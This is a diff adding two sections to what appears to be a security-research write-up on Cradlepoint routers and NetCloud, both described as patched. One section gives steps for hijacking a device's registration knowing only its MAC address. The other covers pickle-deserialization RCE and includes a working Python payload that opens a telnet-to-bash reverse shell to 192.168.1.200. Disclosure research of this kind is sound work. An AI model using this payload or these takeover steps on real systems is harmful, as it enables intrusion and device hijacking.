@@ -152,8 +152,53 @@ $ mitmproxy --mode transparent --set confdir=$HOME/mitmproxy --rawtcp --tcp-host
 
 ## Disconnect any Cradlepoint Router from NetCloud
 
-**TODO**
+A device registered with Netcloud can be disconnected remotely by registering it again from any machine connected to the Internet by knowing its MAC address only (w/o
+Netcloud credentials and w/o accessing the device physically). The device identity is based on its MAC address only. 
 
-## RCE
+To reproduce, one has to go through the following steps:
 
-**TODO**
+1. We found a function in the Python middleware involved in the registration process called `insecure_registration`. This function is taking a MAC address as input and is computing a value out of it with some multiple hashes. We were able to get a temporary Netcloud authentication token using this function by calling the Netcloud API function `check_activation` with the result of the `insecure_registration` function, using a valid MAC address as input. Such MAC addresses can be easily obtained from online marketplace such as ebay.
+After calling the API one receives an access token from stream.cradlepointecm.com, e.g.:
+```
+{'token_id': 'temp-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx',
+'token_secret': 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'}
+```
+2. This token can then be used to call the `authorize` and `register` Netcloud APIs to register the targeted device with its MAC address from any machine.
+3. As a result, the targeted device is disconnected from its Netcloud account and disappears. Also, it loses its license. To re-connect the router, it must be manually
+re-registered via the web/ssh interface or physical access.
+
+The attacker does not need to have a Netcloud account by her/himself. Only knowledge of the target’s MAC address is needed.
+This vulnerability has been patched.
+
+## RCE through deserializing untrusted data
+
+By analyzing the traffic between Netcloud and our Cradlepoint router, we noticed that during registration, the router engages in a license sync with
+Netcloud by sending its license as a **pickled Base64 encoded byte stream**. Here is an example:
+
+```
+{'command': 'post', 'args': {'queue': 'license_sync', 'id': 'xxx', 'value': {'success': True, 'data': 'gAJ9[...]=='}}} 
+```
+
+The [Python pickle module](https://docs.python.org/3/library/pickle.html) implements binary protocols for serializing and de-serializing a Python object structure. A big warning is stated:
+
+**Warning The pickle module is not secure. Only unpickle data you trust.**
+
+As we control the data, it’s possible to execute malicious pickle opcodes on Netcloud servers. For example remote execution is possible, see [this blog](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). We can use this simple payload to get a reverse shell:
+
+```python
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('telnet 192.168.1.200 8080 | /bin/bash | telnet 192.168.1.200 8081')
+        return os.system, (cmd,)
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(pickled)
+```
+
+We didn’t run the attack against Netcloud, but were able to exploit the issue in the other direction on the router.
+This vulnerability has been patched. 
